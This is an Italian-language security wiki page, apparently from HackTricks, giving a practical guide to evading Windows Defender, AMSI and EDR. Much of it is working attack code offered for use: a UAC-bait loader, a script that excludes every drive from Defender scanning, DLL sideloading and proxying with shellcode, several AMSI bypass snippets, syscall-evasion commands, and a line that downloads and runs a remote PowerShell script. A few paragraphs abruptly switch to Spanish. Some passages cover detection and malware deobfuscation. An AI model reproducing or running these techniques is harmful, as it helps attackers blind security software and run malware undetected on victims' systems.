# Bypass dell'antivirus (AV)

{{#include ../banners/hacktricks-training.md}}

**Questa pagina è stata scritta inizialmente da** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Fermare Defender

- [defendnot](https://github.com/es3n1n/defendnot): Uno strumento per impedire a Windows Defender di funzionare.
- [no-defender](https://github.com/es3n1n/no-defender): Uno strumento per impedire a Windows Defender di funzionare fingendosi un altro AV.
- [Disattivare Defender se si è admin](basic-powershell-for-pentesters/README.md)

### Esca UAC in stile installer prima di manomettere Defender

I loader pubblici che si spacciano per cheat di giochi vengono spesso distribuiti come installer Node.js/Nexe non firmati, che prima **chiedono all'utente di ottenere privilegi elevati** e solo dopo neutralizzano Defender. Il flusso è semplice:

1. Verificare la presenza di un contesto amministrativo con `net session`. Il comando ha successo solo quando chi lo esegue dispone dei diritti di admin, quindi un errore indica che il loader è in esecuzione come utente standard.
2. Riavviarsi immediatamente usando il verbo `RunAs` per attivare la richiesta di consenso UAC prevista, mantenendo la riga di comando originale.

```powershell
if (-not (net session 2>$null)) {
    powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
    exit
}
```

Le vittime credono già di installare software “crackato”, quindi di solito accettano la richiesta, concedendo al malware i diritti necessari per modificare i criteri di Defender.<sup>[[26]](#references)</sup>

### Esclusioni generalizzate di `MpPreference` per ogni lettera di unità

Una volta ottenuti i privilegi elevati, le catene in stile GachiLoader ampliano al massimo i punti ciechi di Defender, invece di disabilitare direttamente il servizio. Il loader termina prima il watchdog della GUI (`taskkill /F /IM SecHealthUI.exe`) e poi imposta **esclusioni estremamente ampie**, rendendo impossibile la scansione di ogni profilo utente, directory di sistema e disco rimovibile:

```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```

Osservazioni chiave:

- Il ciclo passa in rassegna ogni filesystem montato (D:\, E:\, chiavette USB, ecc.), quindi **qualsiasi payload futuro salvato in qualsiasi punto del disco viene ignorato**.
- L'esclusione dell'estensione `.sys` è una precauzione per il futuro: gli attaccanti si riservano la possibilità di caricare driver non firmati in seguito, senza dover intervenire nuovamente su Defender.
- Tutte le modifiche vengono applicate in `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions`, così le fasi successive possono verificare che le esclusioni persistano o ampliarle senza attivare nuovamente l'UAC.

Poiché nessun servizio di Defender viene arrestato, i controlli superficiali di stato continuano a segnalare “antivirus attivo”, anche se l'ispezione in tempo reale non interviene mai su quei percorsi.<sup>[[26]](#references)</sup>

## **AV Evasion Methodology**

Attualmente, gli AV utilizzano metodi diversi per stabilire se un file è dannoso: rilevamento statico, analisi dinamica e, nel caso degli EDR più avanzati, analisi comportamentale.

### **Rilevamento statico**

Il rilevamento statico consiste nell'individuare stringhe dannose note o sequenze di byte in un binario o script, e nell'estrarre informazioni dal file stesso (ad esempio, descrizione del file, nome dell'azienda, firme digitali, icona, checksum, ecc.). Ciò significa che l'uso di strumenti pubblici noti può farti rilevare più facilmente, perché probabilmente sono già stati analizzati e segnalati come dannosi. Esistono diversi modi per aggirare questo tipo di rilevamento:

- **Crittografia**

Se crittografi il binario, l'AV non potrà rilevare il tuo programma, ma ti servirà una sorta di loader per decrittografare ed eseguire il programma in memoria.

- **Offuscamento**

A volte basta modificare alcune stringhe nel binario o nello script per superare i controlli dell'AV, ma questa operazione può richiedere molto tempo, a seconda di ciò che vuoi offuscare.

- **Strumenti personalizzati**

Se sviluppi i tuoi strumenti, non esisteranno firme dannose note, ma ci vorranno molto tempo e impegno.

> [!TIP]
> Un buon modo per verificare il rilevamento statico di Windows Defender è [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). In pratica, divide il file in più segmenti e chiede a Defender di analizzarli uno per uno; in questo modo può indicarti esattamente quali stringhe o byte del binario vengono segnalati.

Ti consiglio vivamente di guardare questa [playlist di YouTube](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) sull'AV Evasion pratica.

### **Analisi dinamica**

L'analisi dinamica si verifica quando l'AV esegue il tuo binario in una sandbox e controlla eventuali attività dannose (ad esempio, tentare di decrittografare e leggere le password del browser, eseguire un minidump di LSASS, ecc.). Questa fase può essere un po' più complicata da gestire, ma ecco alcune cose che puoi fare per evadere le sandbox.

- **Attendere prima dell'esecuzione** A seconda di come è implementata, questa può essere un'ottima soluzione per aggirare l'analisi dinamica degli AV. Gli AV hanno pochissimo tempo per analizzare i file, così da non interrompere il flusso di lavoro dell'utente; quindi, le attese prolungate possono interferire con l'analisi dei binari. Il problema è che molte sandbox degli AV possono semplicemente saltare l'attesa, a seconda di come è implementata.
- **Controllare le risorse della macchina** Di solito le sandbox dispongono di risorse molto limitate (ad esempio, < 2GB di RAM), altrimenti potrebbero rallentare la macchina dell'utente. Puoi anche sbizzarrirti: ad esempio, controllando la temperatura della CPU o persino la velocità delle ventole; non tutto sarà implementato nella sandbox.
- **Controlli specifici della macchina** Se vuoi prendere di mira un utente la cui workstation è aggiunta al dominio "contoso.local", puoi controllare il dominio del computer per vedere se corrisponde a quello specificato; in caso contrario, puoi far terminare il programma.

A quanto pare, il nome del computer della sandbox di Microsoft Defender è HAL9TH. Puoi quindi controllare il nome del computer nel tuo malware prima della detonazione: se corrisponde a HAL9TH, significa che ti trovi nella sandbox di Defender e puoi far terminare il programma.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>fonte: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Altri ottimi consigli di [@mgeeky](https://twitter.com/mariuszbit) per contrastare le sandbox

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> canale #malware-dev</p></figcaption></figure>

Come abbiamo già detto in questo post, gli **strumenti pubblici** alla fine **vengono rilevati**; quindi, dovresti porti una domanda:

Ad esempio, se vuoi fare il dump di LSASS, **ti serve davvero usare mimikatz**? Oppure potresti usare un progetto diverso, meno conosciuto, che esegue comunque il dump di LSASS?

Probabilmente la risposta giusta è la seconda. Prendendo mimikatz come esempio, è probabilmente uno dei malware più segnalati dagli AV e dagli EDR, se non il più segnalato. Il progetto in sé è davvero interessante, ma aggirare gli AV mentre lo si usa è un incubo; quindi, cerca delle alternative per ottenere ciò che vuoi.

> [!TIP]
> Quando modifichi i payload per evadere il rilevamento, assicurati di **disattivare l'invio automatico dei campioni** in Defender e, sul serio, **NON CARICARE SU VIRUSTOTAL** se il tuo obiettivo è riuscire a evadere il rilevamento nel lungo periodo. Se vuoi verificare se un determinato AV rileva il tuo payload, installalo su una VM, prova a disattivare l'invio automatico dei campioni e testalo lì finché non sei soddisfatto del risultato.

## EXEs vs DLLs

Quando possibile, **privilegia sempre l'uso delle DLL per l'evasione**: secondo la mia esperienza, i file DLL vengono solitamente **rilevati e analizzati molto meno**, quindi in alcuni casi questo è un semplice trucco per evitare il rilevamento (se il tuo payload può essere eseguito come DLL, ovviamente).

Come si vede in questa immagine, un payload DLL di Havoc ha un tasso di rilevamento di 4/26 su antiscan.me, mentre il payload EXE ha un tasso di rilevamento di 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>confronto su antiscan.me tra un normale payload EXE di Havoc e una normale DLL di Havoc</p></figcaption></figure>

Ora vedremo alcuni trucchi che puoi usare con i file DLL per essere molto più furtivo.

## DLL Sideloading & Proxying

Il **DLL Sideloading** sfrutta l'ordine di ricerca delle DLL utilizzato dal loader, collocando l'applicazione vittima e i payload dannosi fianco a fianco.

Puoi individuare i programmi vulnerabili al DLL Sideloading usando [Siofra](https://github.com/Cybereason/siofra) e il seguente script PowerShell:

```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
    $binarytoCheck = "C:\Program Files\" + $_
    C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```

Questo comando mostrerà l’elenco dei programmi soggetti a DLL hijacking all’interno di "C:\Program Files\\" e dei file DLL che tentano di caricare.

Ti consiglio vivamente di **esplorare personalmente i programmi soggetti a DLL Hijacking/Sideloading**: se eseguita correttamente, questa tecnica è piuttosto stealth, ma se usi programmi DLL Sideloadable noti pubblicamente, potresti farti individuare facilmente.

Il semplice posizionamento di una DLL malevola con il nome di una DLL che un programma si aspetta di caricare non farà sì che venga caricato il tuo payload, perché il programma si aspetta che quella DLL contenga funzioni specifiche. Per risolvere questo problema, useremo un’altra tecnica chiamata **DLL Proxying/Forwarding**.

**DLL Proxying** inoltra alla DLL originale le chiamate che un programma effettua dalla DLL proxy (e malevola), preservando così la funzionalità del programma e consentendo l’esecuzione del tuo payload.

Userò il progetto [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) di [@flangvik](https://twitter.com/Flangvik/)

Ecco i passaggi che ho seguito:

```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```

L'ultimo comando ci fornirà 2 file: un modello di codice sorgente di una DLL e la DLL originale rinominata.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>

```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```

Questi sono i risultati:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Sia il nostro shellcode (codificato con [SGN](https://github.com/EgeBalci/sgn)) sia la proxy DLL hanno un tasso di rilevamento pari a 0/26 su [antiscan.me](https://antiscan.me)! Direi che è un successo.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> **Ti consiglio vivamente** di guardare il [VOD su Twitch di S3cur3Th1sSh1t](https://www.twitch.tv/videos/1644171543) sul DLL Sideloading e anche il [video di ippsec](https://www.youtube.com/watch?v=3eROsG_WNpE) per approfondire quanto abbiamo discusso.

### Abuso degli export inoltrati (ForwardSideLoading)

I moduli PE di Windows possono esportare funzioni che in realtà sono "forwarder": invece di puntare al codice, la voce di export contiene una stringa ASCII nel formato `TargetDll.TargetFunc`. Quando un chiamante risolve l'export, il loader di Windows:

- Carica `TargetDll` se non è già caricato
- Risolve `TargetFunc` al suo interno

Comportamenti importanti da comprendere:
- Se `TargetDll` è una KnownDLL, viene fornita dallo spazio dei nomi protetto KnownDLLs (ad es. ntdll, kernelbase, ole32).<sup>[[15]](#references)</sup>
- Se `TargetDll` non è una KnownDLL, viene usato il normale ordine di ricerca delle DLL, che include la directory del modulo che sta eseguendo la risoluzione del forward.

Questo permette una primitiva di sideloading indiretta: trova una DLL firmata che esporta una funzione inoltrata a un modulo non-KnownDLL, quindi colloca la DLL firmata insieme a una DLL controllata dall'attaccante, con lo stesso nome esatto del modulo di destinazione inoltrato. Quando viene invocato l'export inoltrato, il loader risolve il forward e carica la tua DLL dalla stessa directory, eseguendo il tuo DllMain.<sup>[[13]](#references)</sup>

Esempio osservato su Windows 11:

```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```

`NCRYPTPROV.dll` non è una KnownDLL, quindi viene risolta tramite il normale ordine di ricerca.

PoC (copia-incolla):
1) Copia la DLL di sistema firmata in una cartella scrivibile
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Inserisci una `NCRYPTPROV.dll` malevola nella stessa cartella. È sufficiente un `DllMain` minimale per ottenere l'esecuzione di codice; non è necessario implementare la funzione inoltrata per attivare `DllMain`.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
    if (reason == DLL_PROCESS_ATTACH){
        HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}        
    }
    return TRUE;
}
```
3) Attiva il forward con un LOLBin firmato:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```

Comportamento osservato:
- rundll32 (firmato) carica la `keyiso.dll` side-by-side (firmata)
- Durante la risoluzione di `KeyIsoSetAuditingInterface`, il loader segue il forward verso `NCRYPTPROV.SetAuditingInterface`
- Il loader carica quindi `NCRYPTPROV.dll` da `C:\test` ed esegue il suo `DllMain`
- Se `SetAuditingInterface` non è implementata, verrà visualizzato un errore "missing API" solo dopo che `DllMain` è già stato eseguito

Suggerimenti per la ricerca:
- Concentrati sulle esportazioni inoltrate il cui modulo di destinazione non è una KnownDLL. Le KnownDLL sono elencate in `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Puoi enumerare le esportazioni inoltrate con strumenti come:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Consulta el inventario de forwarders de Windows 11 para buscar candidatos: https://hexacorn.com/d/apis_fwd.txt<sup>[[14]](#references)</sup>

Ideas de detección/defensa:
- Supervisa los LOLBins (p. ej., rundll32.exe) que cargan DLL firmadas desde rutas que no son del sistema y, a continuación, cargan DLL que no son KnownDLLs con el mismo nombre base desde ese directorio
- Genera alertas sobre cadenas de procesos/módulos como: `rundll32.exe` → `keyiso.dll` que no es del sistema → `NCRYPTPROV.dll` en rutas donde los usuarios pueden escribir
- Aplica políticas de integridad de código (WDAC/AppLocker) e impide la escritura y ejecución en directorios de aplicaciones

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze es un conjunto de herramientas de payload para evadir EDR mediante procesos suspendidos, syscalls directas y métodos de ejecución alternativos`

Puedes usar Freeze para cargar y ejecutar tu shellcode de forma sigilosa.

```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```

<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> L'evasion è un gioco del gatto e del topo: ciò che funziona oggi potrebbe essere rilevato domani, quindi non affidarti mai a un solo strumento; se possibile, prova a concatenare più tecniche di evasion.

## Direct/Indirect Syscalls e risoluzione SSN (SysWhispers4)

Gli EDR spesso applicano **hook inline in user mode** agli stub syscall di `ntdll.dll`. Per bypassare questi hook, puoi generare stub syscall **diretti** o **indiretti** che caricano l'**SSN** (System Service Number) corretto e passano alla modalità kernel senza eseguire l'entrypoint dell'export sottoposto a hook.<sup>[[32]](#references)</sup>

**Opzioni di invocazione:**
- **Direct (embedded)**: inserisce un'istruzione `syscall`/`sysenter`/`SVC #0` nello stub generato (senza accedere a un export di `ntdll`).
- **Indirect**: salta a un gadget `syscall` esistente all'interno di `ntdll`, così la transizione al kernel sembra provenire da `ntdll` (utile per l'evasion euristica); **randomized indirect** seleziona un gadget da un pool per ogni chiamata.
- **Egg-hunt**: evita di incorporare su disco la sequenza statica di opcode `0F 05`; risolve una sequenza syscall a runtime.

**Strategie di risoluzione SSN resistenti agli hook:**
- **FreshyCalls (VA sort)**: deduce gli SSN ordinando gli stub syscall in base all'indirizzo virtuale invece di leggere i byte degli stub.
- **SyscallsFromDisk**: mappa una `\KnownDlls\ntdll.dll` pulita, legge gli SSN dal suo `.text`, quindi la smappa (bypassa tutti gli hook in memoria).
- **RecycledGate**: combina la deduzione degli SSN ordinando per VA con la convalida degli opcode quando uno stub è pulito; se è sottoposto a hook, ripiega sulla deduzione tramite VA.
- **HW Breakpoint**: imposta DR0 sull'istruzione `syscall` e usa un VEH per acquisire l'SSN da `EAX` a runtime, senza analizzare byte sottoposti a hook.

Esempio d'uso di SysWhispers4:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```

## AMSI (Anti-Malware Scan Interface)

AMSI è stato creato per contrastare il "[malware senza file](https://en.wikipedia.org/wiki/Fileless_malware)". Inizialmente, gli AV erano in grado di analizzare solo i **file su disco**; quindi, se riuscivi in qualche modo a eseguire payload **direttamente in memoria**, l'AV non poteva fare nulla per impedirlo, perché non disponeva di visibilità sufficiente.

La funzionalità AMSI è integrata nei seguenti componenti di Windows.

- User Account Control, o UAC (elevazione di EXE, COM, MSI o installazioni ActiveX)
- PowerShell (script, uso interattivo e valutazione dinamica del codice)
- Windows Script Host (wscript.exe e cscript.exe)
- JavaScript e VBScript
- Macro VBA di Office

Consente alle soluzioni antivirus di ispezionare il comportamento degli script esponendone i contenuti in forma non crittografata e non offuscata.

L'esecuzione di `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` genererà il seguente avviso in Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Nota come anteponga `amsi:` e poi il percorso dell'eseguibile da cui è stato eseguito lo script, in questo caso powershell.exe

Non abbiamo scritto alcun file su disco, ma siamo stati comunque rilevati in memoria a causa di AMSI.

Inoltre, a partire da **.NET 4.8**, anche il codice C# viene sottoposto ad AMSI. Questo riguarda anche `Assembly.Load(byte[])` per caricare codice da eseguire in memoria. Ecco perché, per l'esecuzione in memoria, è consigliato usare versioni precedenti di .NET (come la 4.7.2 o precedenti) se si vuole eludere AMSI.

Esistono un paio di modi per aggirare AMSI:

- **Offuscamento**

Poiché AMSI si basa principalmente su rilevamenti statici, modificare gli script che si cerca di caricare può essere un buon modo per eludere il rilevamento.

Tuttavia, AMSI è in grado di deoffuscare gli script anche se presentano più livelli di offuscamento, quindi l'offuscamento potrebbe essere una scelta sbagliata, a seconda di come viene eseguito. Questo rende l'elusione tutt'altro che semplice. A volte, però, basta cambiare un paio di nomi di variabili per risolvere il problema: tutto dipende da quanto qualcosa è stato segnalato.

- **AMSI Bypass**

Poiché AMSI viene implementato caricando una DLL nel processo di powershell (oltre che in cscript.exe, wscript.exe, ecc.), è facile manometterlo, anche con un utente non privilegiato. A causa di questa falla nell'implementazione di AMSI, i ricercatori hanno trovato diversi modi per eludere l'analisi di AMSI.

**Forzare un errore**

Forzare il fallimento dell'inizializzazione di AMSI (amsiInitFailed) impedirà l'avvio di qualsiasi scansione per il processo corrente. La tecnica è stata inizialmente resa nota da [Matt Graeber](https://twitter.com/mattifestation) e Microsoft ha sviluppato una signature per impedirne un uso più diffuso.

```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

È bastata una riga di codice PowerShell per rendere AMSI inutilizzabile nel processo PowerShell corrente. Naturalmente, AMSI stesso ha rilevato questa riga, quindi è necessario modificarla per poter usare questa tecnica.

Ecco un bypass di AMSI modificato che ho preso da questo [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).

```bash
Try{#Ams1 bypass technic nº 2
      $Xdatabase = 'Utils';$Homedrive = 'si'
      $ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
      $DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
      $fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
      $CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
      $Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
      $SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
      $Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
      $Spotfix.SetValue($null,$true)
   }Catch{Throw $_}
```

Tieni presente che probabilmente questo verrà rilevato non appena il post sarà pubblicato, quindi non dovresti pubblicare codice se il tuo obiettivo è rimanere inosservato.

**Memory Patching**

Questa tecnica è stata scoperta inizialmente da [@RastaMouse](https://twitter.com/_RastaMouse/) e consiste nel trovare l'indirizzo della funzione "AmsiScanBuffer" in amsi.dll (responsabile dell'analisi dell'input fornito dall'utente) e sovrascriverla con istruzioni che restituiscono il codice E_INVALIDARG. In questo modo, il risultato dell'analisi effettiva sarà 0, valore interpretato come esito pulito.

> [!TIP]
> Leggi [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) per una spiegazione più dettagliata.

Esistono anche molte altre tecniche per bypassare AMSI con powershell. Consulta [**questa pagina**](basic-powershell-for-pentesters/index.html#amsi-bypass) e [**questo repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) per saperne di più.

### Bloccare AMSI impedendo il caricamento di amsi.dll (hook di LdrLoadDll)

AMSI viene inizializzato solo dopo il caricamento di `amsi.dll` nel processo corrente. Un bypass robusto e indipendente dal linguaggio consiste nell'applicare un hook in modalità utente a `ntdll!LdrLoadDll` che restituisce un errore quando il modulo richiesto è `amsi.dll`. Di conseguenza, AMSI non viene mai caricato e il processo non esegue alcuna scansione.<sup>[[23]](#references)</sup>

Schema di implementazione (pseudocodice C/C++ x64):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
    if (module && module->Buffer){
        UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
        if (RtlEqualUnicodeString(module, &amsi, TRUE)){
            // Pretend the DLL cannot be found → AMSI never initialises in this process
            return STATUS_DLL_NOT_FOUND; // 0xC0000135
        }
    }
    return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
    // Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
    // e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Note
- Funziona con PowerShell, WScript/CScript e loader personalizzati (qualsiasi cosa che altrimenti caricherebbe AMSI).
- Abbinalo all'invio degli script tramite stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`) per evitare artefatti lunghi nella riga di comando.
- È stato visto in uso con loader eseguiti tramite LOLBins (ad es., `regsvr32` che richiama `DllRegisterServer`).

Anche lo strumento **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** genera script per bypassare AMSI.
Anche lo strumento **[https://amsibypass.com/](https://amsibypass.com/)** genera script per bypassare AMSI, evitando le signature con funzioni definite dall'utente e variabili randomizzate, espressioni di caratteri e l'applicazione di maiuscole e minuscole casuali alle keyword di PowerShell.

**Rimuovere la signature rilevata**

Puoi usare strumenti come **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** e **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** per rimuovere la signature AMSI rilevata dalla memoria del processo corrente. Questo strumento analizza la memoria del processo corrente alla ricerca della signature AMSI e poi la sovrascrive con istruzioni NOP, rimuovendola di fatto dalla memoria.

**Prodotti AV/EDR che usano AMSI**

Puoi trovare un elenco di prodotti AV/EDR che usano AMSI in **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Usare PowerShell versione 2**
Se usi PowerShell versione 2, AMSI non verrà caricato e potrai eseguire gli script senza che AMSI li analizzi. Puoi fare così:

```bash
powershell.exe -version 2
```

## Logging di PS

Il logging di PowerShell è una funzionalità che consente di registrare tutti i comandi PowerShell eseguiti su un sistema. Può essere utile per finalità di auditing e risoluzione dei problemi, ma può anche rappresentare un **problema per gli attaccanti che vogliono eludere il rilevamento**.

Per aggirare il logging di PowerShell, puoi usare le seguenti tecniche:

- **Disabilitare la trascrizione e il logging dei moduli di PowerShell**: a questo scopo puoi usare uno strumento come [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs).
- **Usare PowerShell versione 2**: se usi PowerShell versione 2, AMSI non verrà caricato e potrai eseguire gli script senza che vengano analizzati da AMSI. Puoi farlo così: `powershell.exe -version 2`
- **Usare una sessione PowerShell non gestita**: usa [UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) per ospitare PowerShell senza avviare `powershell.exe` (l'approccio usato da `powerpick` di Cobalt Strike). Questo elude i controlli legati specificamente al processo `powershell.exe`, ma non disabilita di per sé AMSI, Script Block Logging o tutte le altre difese di PowerShell; la copertura dipende dal runtime e dall'implementazione dell'host.


## Offuscamento

> [!TIP]
> Diverse tecniche di offuscamento si basano sulla cifratura dei dati, che aumenta l'entropia del binario e ne facilita il rilevamento da parte degli AV e degli EDR. Fai attenzione e valuta di applicare la cifratura solo a sezioni specifiche del codice che sono sensibili o devono essere nascoste.

### Deoffuscare i binari .NET protetti da ConfuserEx

Quando si analizza malware che usa ConfuserEx 2 (o fork commerciali), è comune incontrare diversi livelli di protezione che bloccano i decompilatori e le sandbox. Il flusso di lavoro seguente **ripristina in modo affidabile un IL quasi originale**, che può poi essere decompilato in C# con strumenti come dnSpy o ILSpy.<sup>[[10]](#references)</sup>

1.  Rimozione dell'anti-tampering – ConfuserEx cifra ogni *corpo di metodo* e lo decifra all'interno del costruttore statico del *modulo* (`<Module>.cctor`). Modifica anche il checksum PE, in modo che qualsiasi modifica causi l'arresto anomalo del binario. Usa **AntiTamperKiller** per individuare le tabelle dei metadati cifrate, recuperare le chiavi XOR e riscrivere un assembly pulito:
   ```bash
   # https://github.com/wwh1004/AntiTamperKiller
   python AntiTamperKiller.py Confused.exe Confused.clean.exe
   ```
   L'output contiene i 6 parametri anti-tamper (`key0-key3`, `nameHash`, `internKey`) che possono essere utili per creare il proprio unpacker.

2.  Recupero di simboli / flusso di controllo – passa il file *clean* a **de4dot-cex** (un fork di de4dot compatibile con ConfuserEx).
   ```bash
   de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
   ```
   Flags:
     • `-p crx` – seleziona il profilo ConfuserEx 2
     • de4dot annullerà l'appiattimento del flusso di controllo, ripristinerà namespace, classi e nomi delle variabili originali e decrittograferà le stringhe costanti.

3.  Rimozione delle chiamate proxy – ConfuserEx sostituisce le chiamate dirette ai metodi con wrapper leggeri (ovvero *chiamate proxy*) per ostacolare ulteriormente la decompilazione. Rimuovili con **ProxyCall-Remover**:
   ```bash
   ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
   ```
   Dopo questo passaggio dovresti vedere normali API .NET come `Convert.FromBase64String` o `AES.Create()` invece di funzioni wrapper opache (`Class8.smethod_10`, …).

4.  Pulizia manuale – esegui il binario con dnSpy e cerca grandi blob Base64 o l’uso di `RijndaelManaged`/`TripleDESCryptoServiceProvider` per individuare il *payload* reale. Spesso il malware lo memorizza come array di byte codificato TLV, inizializzato all’interno di `<Module>.byte_0`.

La catena descritta ripristina il flusso di esecuzione **senza** dover eseguire il sample malevolo: è utile quando si lavora su una workstation offline.

> 🛈  ConfuserEx produce un attributo personalizzato chiamato `ConfusedByAttribute`, che può essere usato come IOC per classificare automaticamente i sample.

#### Comando su una riga
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```

---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: offuscatore C#**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): L'obiettivo di questo progetto è fornire un fork open source della suite di compilazione [LLVM](http://www.llvm.org/) in grado di aumentare la sicurezza del software tramite [l'offuscamento del codice](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) e la protezione contro le manomissioni.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator dimostra come usare il linguaggio `C++11/14` per generare codice offuscato in fase di compilazione, senza usare strumenti esterni né modificare il compilatore.
- [**obfy**](https://github.com/fritzone/obfy): Aggiunge un livello di operazioni offuscate generate dal framework di metaprogrammazione dei template C++, rendendo un po' più difficile la vita di chi vuole crackare l'applicazione.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz è un offuscatore di binari x64 in grado di offuscare diversi tipi di file PE, tra cui .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame è un semplice motore di codice metamorfico per eseguibili arbitrari.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator è un framework di offuscamento del codice granulare per i linguaggi supportati da LLVM, che usa ROP (return-oriented programming). ROPfuscator offusca un programma a livello di codice assembly trasformando le istruzioni regolari in catene ROP, contrastando la nostra concezione naturale del normale flusso di controllo.
